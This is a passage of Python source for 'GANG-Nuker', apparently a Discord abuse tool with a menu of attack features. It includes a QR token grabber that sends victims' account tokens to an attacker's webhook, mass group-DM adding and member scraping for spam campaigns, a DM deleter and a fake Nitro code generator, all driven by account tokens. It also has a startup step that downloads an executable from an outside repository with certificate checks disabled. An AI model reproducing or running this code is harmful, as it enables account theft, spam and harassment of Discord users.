                with open("utilities/QR/groups.txt", "w") as groupID:
                    groupID.write(jsr['id'] + '\n')

            except:
                print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])

            scrIds = random.choice(open('utilities/QR/groups.txt').readlines())
            grID = scrIds.strip('\n')
            r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                              headers={'Authorization': token})
            if r2.status_code == 204:
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Group Members: {UserID}')

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   AUTO LOGIN
    if choice == '23':
        Spinner()
        token = input(
            f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Auto_Login.TokenLogin(token)



#   DM DELETER
    if choice == '24':
            Spinner()
            token = input(
            f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
            validateToken(token)
            processes = []
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
            if not channelIds:
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] This Token Has 0 Dms to Delete!")
                sleep(2)
                spammer()
            for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                    t = threading.Thread(target=utilities.Plugins.DM_Deleter.DmDeleter, args=(token, channel))
                    t.start()
                    processes.append(t)
            for process in processes:
                process.join()
            input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')



#   TOKEN GENERATOR
    if choice == '25':
        Spinner()
        gh = input(f"""
Token Generator is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!
                                   
[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.com')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   NITRO GENERATOR
    if choice == '26':
        Spinner()

        count = 0

        colorama.init(autoreset=True)
        link = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL?: ")
        amount = int(input("[\x1b[95m>\x1b[95m\x1B[37m] Amount of Nitro Codes?: "))
        for i in range(amount):
            time.sleep(1)
            code = "https://discord.gift/" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
            count += 1
            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Generated Nitro {count}')
            webhook = Webhook.from_url(link, adapter=RequestsWebhookAdapter())
            webhook.send(code)



#   QR TOKEN GRABBER
    elif choice == '27':
        WebHook = input(
            f'\n[\x1b[95m>\x1b[95m\x1B[37m] Webhook URL: ')
        validateWebhook(WebHook)
        utilities.Plugins.QR_Grabber.QR_Grabber(WebHook)   



#   MEMBER ID SCRAPER
    if choice == '28':
            Spinner()
            tukan = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
            guildd = input('[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
            chann = input('[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')
            bot = discum.Client(token=tukan)

            def closefetching(resp,guildid):
             if bot.gateway.finishedMemberFetching(guildid):
                lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
                print(str(lenmembersfetched))
                bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
                bot.gateway.close()

            def getmembers(guildid,channelid):
                 bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
                 bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
                 bot.gateway.run()
                 bot.gateway.resetSession()
                 return bot.gateway.session.guild(guildid).members

            members = getmembers(guildd, chann)

            memberids = []

            for memberId in members:
                memberids.append(memberId)

            cls()

            with open('utilities/QR/massdm_IDs.txt','w') as ids:
                for element in memberids:
                    ids.write(element + '\n')    

            print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Finished Scraping {len(memberids)} members!\n(The members have already been put into the correct files for spamming!)')

            time.sleep(1)
            exit = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
            exit = clear()
            exit = spammer()



#   PFP CHANGER
    if choice == '29':
        Spinner()
        exec(open('utilities/Plugins/PFP_Changer.py').read())



#   ABOUT
    if choice == '30':
        Spinner()
        Write.Print("Hello, thanks for using GANG-Nuker!\nif you run into any problems make sure to let me know asap!\nDiscord: ††#9999\nGithub: https://github.com/TT-Tutorials\n\n", Colors.purple_to_blue, interval=0.015)

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   THREADS
    if choice == '31':
            Spinner()
            print(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Current: {Fore.RED}{threads}{Fore.RESET}")
            try:
                amount = int(
                    input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Thread Amount: '))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] | Invalid Amount!')
                sleep(1.5)
                spammer()
            if amount >= 40:
                print(f"[{Fore.RED}ERROR{Fore.RESET}] | Having {Fore.RED}{amount}{Fore.RESET} Will Cause Ratelimited! Try Something Lower...")
                sleep(4)
                spammer()
            elif amount >= 15:
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Having More Than 15 Threads Can Cause Lag and Ratelimit... [{Fore.RED}{amount}{Fore.RESET}]\nContinue With High Thread?")
                yesno = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] y/n?: ')
                if yesno.lower() != "y":
                    sleep(0.5)
                    spammer()
            threads = amount
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] Thread Changed to: {amount}")
            sleep(1.5)
            spammer()



#   EXIT
    if choice == '32':
            sys.exit(0)



#   AUTO DOWNLOAD DRIVERS
if __name__ == "__main__":
                import sys
                setTitle("Downloading ChromeDriver...")
                os.system("""if not exist "./chromedriver.exe" echo [-] Downloading Drivers: """)
                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
                if os.path.basename(sys.argv[0]).endswith("exe"):
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\gang_proxies"):
                        proxy_scrape()
                    clear()
                else:
                    search_for_updates()
                    if not os.path.exists(getTempDir()+"\\gang_proxies"):
                        proxy_scrape()
                    clear()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()
spammer()